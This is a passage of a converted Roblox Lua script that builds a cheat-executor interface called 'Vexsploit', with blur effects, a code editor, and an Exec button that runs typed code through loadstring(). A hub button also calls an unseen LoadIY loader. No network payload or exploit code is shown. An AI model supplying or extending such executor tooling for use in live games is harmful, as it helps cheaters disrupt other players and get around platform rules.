	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_23);
-- Workspace.Vexsploit.MainFrame.Hub.idk.BlurController
local function C_27()
local script = G2L["27"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_27);
-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.Frame.TextButton.LocalScript
local function C_33()
local script = G2L["33"];
	local scripts = require(script.Parent.Parent.Parent.Parent.Scripts)
	
	script.Parent.MouseButton1Click:Connect(function()
		scripts.LoadIY()
	end)
end;
task.spawn(C_33);
-- Workspace.Vexsploit.MainFrame.Executor1.BlurController
local function C_3b()
local script = G2L["3b"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_3b);
-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Frame.LineHandler
local function C_3f()
local script = G2L["3f"];
	local CodeTextBoxScrolling = script.Parent.Parent
	local CodeTextBox = CodeTextBoxScrolling.Code
	local LineNumbersFrame = script.Parent
	local lineHeight = 14 -- Adjust this to match the line height of your text
	
	-- Function to split the text into lines
	local function getLines(text)
		local lines = {}
		if text == "" then
			table.insert(lines, "")
		else
			for line in (text .. "\n"):gmatch("(.-)\n") do
				table.insert(lines, line)
			end
		end
		return lines
	end
	
	-- Function to update the line numbers based on text content
	local function updateLineNumbers()
		local lines = getLines(CodeTextBox.Text)
	
		-- Create or reuse labels for each line
		for i = 1, #lines do
			local label = LineNumbersFrame:FindFirstChild("LineLabel_" .. i)
	
			if not label then
				label = Instance.new("TextLabel")
				label.Name = "LineLabel_" .. i
				label.BackgroundTransparency = 1
				label.TextXAlignment = Enum.TextXAlignment.Right
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
				label.Font = Enum.Font.Code  -- Monospace font
				label.TextSize = 14
				label.TextScaled = false
				label.Size = UDim2.new(0, 30, 0, lineHeight)  -- Fixed size (width: 30, height: 20)
				label.Parent = LineNumbersFrame
			end
	
			label.Text = tostring(i)
			label.Position = UDim2.new(0, 0, 0, (i - 1) * lineHeight)  -- Stack vertically with no space in between
		end
	
		-- Remove any extra labels if the number of lines decreases
		local i = #lines + 1
		while true do
			local extra = LineNumbersFrame:FindFirstChild("LineLabel_" .. i)
			if not extra then break end
			extra:Destroy()
			i += 1
		end
	end
	
	-- Update line numbers whenever text changes
	CodeTextBox:GetPropertyChangedSignal("Text"):Connect(updateLineNumbers)
	
	-- Initial call to set up the line numbers
	updateLineNumbers()
end;
task.spawn(C_3f);
-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Code.LocalScript
local function C_44()
local script = G2L["44"];
	wait(0)
	script.Parent.Text = 'print("Hello world!")'
end;
task.spawn(C_44);
-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler
local function C_47()
local script = G2L["47"];
	local textbox = script.Parent.Code
	local HiglightText = script.Parent.Highlight
	local Highlighter = require(script.Highlighter)
	
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		HiglightText.Text = textbox.Text
		wait(0)
		Highlighter.highlight({
			textObject = HiglightText
		})
	end)
end;
task.spawn(C_47);
-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Exec.LocalScript
local function C_53()
local script = G2L["53"];
	script.Parent.MouseButton1Click:Connect(function()
		loadstring(script.Parent.Parent.Parent.CodeEditor.Code.Text)()
	end)
end;
task.spawn(C_53);
-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Clear.LocalScript
local function C_59()
local script = G2L["59"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CodeEditor.Code.Text = ""
	end)
end;
task.spawn(C_59);
-- Workspace.Vexsploit.MainFrame.Executor1.AutoExec.LocalScript
local function C_68()
local script = G2L["68"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Text == "Auto-execute (on)" then
			script.Parent.Text = "Auto-execute (off)"
		else
			script.Parent.Text = "Auto-execute (on)"
		end
	end)
end;
task.spawn(C_68);
-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.Close.RemoveTab
local function C_70()
local script = G2L["70"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end;
task.spawn(C_70);
-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.RemoveTab
local function C_7e()
local script = G2L["7e"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end;
task.spawn(C_7e);
-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.LocalScript
local function C_7f()
local script = G2L["7f"];
	script.Parent.MouseButton1Click:Connect(function()
		local newTab = script.Parent.TabButton:Clone()
		newTab.Parent = script.Parent.Parent.TopBar
		newTab.Visible = true
	end)
end;
task.spawn(C_7f);
-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.RemoveTab
local function C_89()
local script = G2L["89"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end;
task.spawn(C_89);
-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.LocalScript
local function C_8a()
local script = G2L["8a"];
	script.Parent.MouseButton1Click:Connect(function()
		local newTab = script.Parent.TabButton:Clone()
		newTab.Parent = script.Parent.Parent.TopBar
		newTab.Visible = true
	end)
end;
task.spawn(C_8a);

return G2L["1"], require;